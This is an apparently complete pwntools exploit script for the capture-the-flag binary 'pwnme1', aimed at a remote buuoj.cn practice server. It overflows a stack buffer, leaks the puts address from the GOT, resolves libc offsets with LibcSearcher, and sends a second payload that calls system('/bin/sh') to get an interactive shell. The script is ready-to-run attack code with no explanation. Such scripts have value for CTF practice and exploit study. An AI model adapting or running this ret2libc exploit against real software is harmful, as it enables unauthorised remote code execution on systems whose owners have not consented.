#+++++++++++++++++++exp.py++++++++++++++++++++
#!/usr/bin/python
# -*- coding:utf-8 -*-                           
#Author: Square_R
#Time: 2021.01.31 16.06.04
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*
from LibcSearcher import*
context.arch = 'amd64'


host = '1.1.1.1'
port = 10000
local = 0
if local:
	context.log_level = 'debug'
	libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
	elf = ELF('./pwnme1')
	sh = process('./pwnme1')
else:
	#context.log_level = 'debug'
	# libc=ELF('null')
	elf = ELF('./pwnme1')
	sh = remote('node3.buuoj.cn',29918)



def pwn():
	sh.sendlineafter('> 6. Exit    \n','5')
	getflag = 0x08048677
	right_addr = 0x08048931
	flag_addr = elf.search('flag').next()
	PopEdiEbp_R = 0x08048897
	PopEsiEdiEbp_R = 0x08048896
	start = 0x08048570
	padding = 'A'*0xa4 + p32(0xdeadbeef) + p32(elf.plt['puts']) + p32(start) + p32(elf.got['puts'])
	# gdb.attach(sh)
	sh.sendlineafter('fruit:',padding)

	sh.recvuntil('\n')
	pust_addr = u32(sh.recv(4))
	libc_s = LibcSearcher('puts',pust_addr)
	libc_addr = pust_addr - libc_s.dump('puts')
	system_addr = libc_addr + libc_s.dump('system')
	bin_sh_addr = libc_addr + libc_s.dump('str_bin_sh')
	success("libc_Addr:0x%x"%(libc_addr))

	payload = 'A'*0xa4 + p32(0xdeadbeef) + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)
	sh.sendlineafter('> 6. Exit    \n','5')
	# gdb.attach(sh)
	sh.sendlineafter('fruit:',payload)
if __name__ == '__main__':
	pwn()
	sh.interactive()

